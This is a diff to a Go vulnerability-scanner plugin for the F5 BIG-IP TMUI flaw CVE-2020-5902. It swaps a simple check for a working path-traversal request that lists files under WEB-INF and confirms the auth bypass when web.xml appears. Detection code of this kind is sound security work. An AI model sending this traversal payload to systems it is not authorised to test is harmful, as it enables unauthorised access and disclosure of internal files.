@@ -1933,25 +1933,39 @@ func (p *SpringCloudPlugin) Run(target ScanTarget) *Vulnerability {
 	return nil
 }
 
-// 55. F5 BIG-IP TMUI RCE (Auth Bypass)
+// 55. F5 BIG-IP TMUI RCE (CVE-2020-5902) - v2
 type F5BigIPPlugin struct{}
 
-func (p *F5BigIPPlugin) Name() string { return "F5 BIG-IP TMUI RCE" }
+func (p *F5BigIPPlugin) Name() string { return "F5 BIG-IP TMUI RCE (CVE-2020-5902)" }
+
 func (p *F5BigIPPlugin) Run(target ScanTarget) *Vulnerability {
 	if !isWebPort(target.Port) {
 		return nil
 	}
-	// Auth bypass attempt via URL manipulation
-	url := getURL(target, "/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp")
-	resp, err := getClient().Get(url)
+
+	client := getClient()
+
+	targetPath := "/tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/usr/local/www/tmui/WEB-INF"
+	fullURL := getURL(target, targetPath)
+
+	resp, err := client.Get(fullURL)
 	if err == nil {
 		defer resp.Body.Close()
+
+		bodyBytes, _ := io.ReadAll(resp.Body)
+		bodyString := string(bodyBytes)
+
 		if resp.StatusCode == 200 {
-			return &Vulnerability{
-				Target: target, Name: "F5 BIG-IP Auth Bypass", Severity: "CRITICAL", CVSS: 9.8,
-				Description: "Unauthorized access to TMUI interface.",
-				Solution:    "Patch F5 device.",
-				Reference:   "CVE-2020-5902",
+			if strings.Contains(bodyString, "web.xml") || strings.Contains(bodyString, "struts-config.xml") {
+				return &Vulnerability{
+					Target:      target,
+					Name:        "F5 BIG-IP TMUI RCE (Verified)",
+					Severity:    "CRITICAL",
+					CVSS:        9.8,
+					Description: "Authentication bypass successful. Internal system files listed via TMUI interface.",
+					Solution:    "Apply F5 security patches immediately or restrict access to the TMUI utility.",
+					Reference:   "CVE-2020-5902",
+				}
 			}
 		}
 	}
@@ -2544,6 +2558,7 @@ func GetPluginInventory() []string {
 		"ASP.NET ViewState Encryption", "Laravel .env Disclosure", "ColdFusion Debugging", "Drupalgeddon2 RCE", "GitLab User Enum", "Nginx Alias Traversal",
 	}
 }
+
 
 
 
